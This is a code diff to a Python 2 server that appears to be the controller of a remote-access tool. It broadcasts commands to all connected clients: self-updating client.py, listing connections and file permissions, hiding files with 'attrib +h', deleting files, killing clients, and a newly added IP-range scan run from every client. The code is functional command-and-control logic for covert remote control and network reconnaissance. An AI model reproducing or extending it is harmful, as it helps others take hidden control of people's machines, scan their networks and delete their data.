@@ -89,7 +89,7 @@ def handle_request(data, open_client_sockets=[], current_socket=None):
                     print soc.getpeername()
                     if soc.getpeername()[0] == d.clientReq.clientStart.ip and soc.getpeername()[1] \
                             not in [d.clientReq.clientStart.port, PORT]:
-                        print "goodbye ", soc.getsockname()
+                        print "goodbye ", soc.getpeername()
                         d1 = data_pb2.TData()
                         d1.serverReq.id = random.randint(1, MAX_RANDOM)
                         d1.serverReq.killYourself.status = 0
@@ -119,6 +119,15 @@ def send_open_socket(open_client_sockets, wlist):
     send_data_to_all(d.SerializeToString(), None, open_client_sockets, wlist)
 
 
+def send_scan_socket(open_client_sockets, wlist):
+    d = data_pb2.TData()
+    d.serverReq.id = random.randint(1, MAX_RANDOM)
+    d.serverReq.scanIps.ip = raw_input("enter ip: ")
+    d.serverReq.scanIps.start = int(raw_input("enter start: "))
+    d.serverReq.scanIps.end = int(raw_input("enter end: "))
+    send_data_to_all(d.SerializeToString(), None, open_client_sockets, wlist)
+
+
 def send_message(msg, open_client_sockets=None, wlist=None):
     if msg.startswith('help'):
         print_options()
@@ -126,10 +135,13 @@ def send_message(msg, open_client_sockets=None, wlist=None):
         send_updates_file('client.py', open_client_sockets, wlist)
     elif msg.startswith('2'):
         send_command("netstat -a -n -o", open_client_sockets, wlist)
+    elif msg.startswith('3.5'):
+        send_command("cd " + raw_input("enter directory: ") + " & for /f %x in ('dir /b') do icacls %x",
+                     open_client_sockets, wlist)
     elif msg.startswith('3'):
         send_command("ls -l", open_client_sockets, wlist)
     elif msg.startswith('4'):
-        send_open_socket(open_client_sockets, wlist)
+        send_open_socket(open_client_sockets, wlist)  # cd client && for /f %x in ('dir /b') do icacls %x
     elif msg.startswith('5'):
         send_command("cd " + raw_input("enter directory: ") + " & dir", open_client_sockets, wlist)
     elif msg.startswith('6'):
@@ -139,6 +151,8 @@ def send_message(msg, open_client_sockets=None, wlist=None):
         send_command("attrib +h " + raw_input("enter file path & name: "), open_client_sockets, wlist)
     elif msg.startswith('8'):
         send_command("del " + raw_input("enter file path & name: "), open_client_sockets, wlist)
+    elif msg.startswith('9'):
+        send_scan_socket(open_client_sockets, wlist)
 
 
 def print_options():
@@ -146,11 +160,13 @@ def print_options():
      1: update version
      2: netstat
      3: ls -- error
+     3.5: show all details of files (like ls -l)
      4: open new socket
-     5: dir
+     5: dir 
      6: move
      7: hidden
-     8: remove'''
+     8: remove
+     9: arp'''
 
 
 def main():
